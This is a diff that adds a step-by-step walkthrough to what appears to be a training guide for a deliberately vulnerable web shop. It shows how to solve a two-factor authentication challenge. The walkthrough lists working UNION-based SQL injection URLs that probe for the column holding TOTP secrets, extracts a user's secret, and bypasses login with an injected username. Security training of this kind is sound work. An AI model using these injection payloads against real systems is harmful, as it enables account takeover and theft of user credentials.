@@ -1440,7 +1440,50 @@ corresponding flag will eventually spoiler the language code `tlh_AA`.
 
 ### Solve the 2FA challenge for user "wurstbrot"
 
-🔧 **TODO**
+1. [Access the administration section of the store](#access-the-administration-section-of-the-store)
+   while inspecting network traffic.
+2. You will learn the email address of the user in question is
+   unsurprisingly `wurstbrot@juice-sh.op`.
+3. You will also notice that there is no information about any user's
+   2FA configuration in the responses from `/api/Users`.
+4. Solve
+   [Retrieve a list of all user credentials via SQL Injection](#retrieve-a-list-of-all-user-credentials-via-sql-injection)
+   and keep its final attack payload ready.
+5. Change the one of the `null`s in payload to hopefully find a column
+   that contains the secret key for the 2FA setup:
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fa,null,null,null%20from%20users-->
+     yields a `500` error with `SequelizeDatabaseError: SQLITE_ERROR: no
+     such column: 2fa`.
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fakey,null,null,null%20from%20users-->
+     fails with `no such column: 2fakey`.
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fasecret,null,null,null%20from%20users-->
+     fails with `no such column: 2fasecret`.
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totp,null,null,null%20from%20users-->
+     also fails with `no such column: totp`.
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpkey,null,null,null%20from%20users-->
+     fails again yielding `no such column: totpkey`.
+   * <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null%20from%20users-->
+     finally succeeds with a `200` response as this column exists!
+6. In the response from
+   <http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null%20from%20users-->
+   find the entry of user `wurstbrot@juice-sh.op` with
+   `"image":"IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"` whereas all other users
+   have `"image":""` set.
+7. Using your favorite 2FA application (e.g.
+   [Google Authenticator](https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2))
+   create a new entry, but instead of scanning any QR code type in the
+   key `IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH` manually.
+8. Go to <http:localhost:3000/#/login> and use SQL Injection to log in
+   with `wurstbrot@juice-sh.op'--` as _Username_ and anything as
+   _Password_.
+9. You will be presented with the _Two Factor Authentication_ input
+   screen where you now have to type in the 6-digit code currently
+   displayed on your 2FA app.
+
+   ![Google Authenticator for wurstbrot](img/2fa_authenticator.png)
+   ![2FA input dialog](img/2fa_challenge.png)
+10. After clicking _Log in_ you are logged in and the challenge will be
+    marked as solved!
 
 ### Forge an essentially unsigned JWT token
 
